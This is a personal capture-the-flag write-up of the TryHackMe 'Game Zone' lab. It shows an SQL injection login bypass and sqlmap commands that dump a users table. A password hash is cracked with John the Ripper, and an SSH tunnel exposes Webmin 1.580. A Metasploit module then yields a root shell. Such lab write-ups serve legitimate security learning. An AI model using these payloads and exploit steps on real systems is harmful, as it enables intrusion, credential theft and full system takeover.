# Game Zone [TryHackMe]

<sub>_This is a raw write-up. I write these to document important things for myself to use later if I need it. At the time of writing this, I don’t even know if I’ve solved the challenge myself. You might see a flag somewhere titled **<sup>Assisted by [write-up link]</sup>** which means I used someone else’s write-up to complete the challenge. Being a responsible learner, I’m trying my best to accept as little help as possible and only when I’m out of ideas._</sub>

## _Manual Exploitation_

Let’s define the `targ3t` variable to reuse later:

```
targ3t=10.10.244.249
```

Let’s browse the website:

```
firefox $targ3t
```

- __What is the name of the large cartoon avatar holding a sniper on the forum?__

TinEye reverse image search suggests it’s __agent 47__.

Following the walkthrough, let’s input the following string in the `username` field and leave `password` field blank to log in:

```
' OR 1=1 -- -
```

- __When you’ve logged in, what page do you get redirected to?__

__portal.php__

Next we need to start **Burp Suite** and intercept the game review search request, save it to a file `request.txt`:

```
POST /portal.php HTTP/1.1
Host: 10.10.13.72
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 15
Origin: http://10.10.13.72
DNT: 1
Connection: keep-alive
Referer: http://10.10.13.72/portal.php
Cookie: PHPSESSID=62ge9ggqcutbuohs03dtcsr5s4
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
Priority: u=0, i

searchitem=test
```

Then we need to run:

```
sqlmap -r request.txt --current-db
```

The current database name is `db`, let's enumerate it:

```
sqlmap -r request.txt -D db --tables
```

Two tables are available: `post` and `users`. Let's enumerate `users`:

```
sqlmap -r request.txt -D db -T users --dump
```

- __In the users table, what is the hashed password?__
`ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14`

- __What was the username associated with the hashed password?__
`agent47`

- __What was the other table name?__
`post`

Let's crack this hash with __John The Ripper__:

```
echo "ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14" > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA256
```

- __What is the de-hashed password?__
`videogamer124`

Now let's try to ssh into the machine:

```
ssh agent47@$targ3t
```

- __What is the user flag?__
`[REDACTED]`

Let's move on to exploiting services with reverse SSH tunnels. We need to use `ss` to list sockets running on a host:

```
ss -tulpn
```

- __How many TCP sockets are running?__
__5__

A service running on port `10000` is blocked by a firewall, but we can expose it to our machine using an SSH Tunnel:

```
ssh -L 10000:localhost:10000 agent47@$targ3t
firefox localhost:10000
```

- __What is the name of the exposed CMS?__
__Webmin__

- __What is the CMS version?__
`1.580`

Let's start `msfconsole` for privilege escalation now:

```
msfconsole
search type:exploit webming
```

I'll use this one: `unix/webapp/webmin_show_cgi_exec`:

```
use 0
show options
```

It needs a number of options to be set:

```
set LHOST tun0
set USERNAME agent47
set PASSWORD videogamer124
set RHOSTS localhost
set SSL false
run
```

This returns a root shell in the background, let's foreground it:

```
sessions -i 2
```

Let's go to the root's home directory and see the flag:

```
cd /root
ls
cat root.txt
```

And there's our flag!
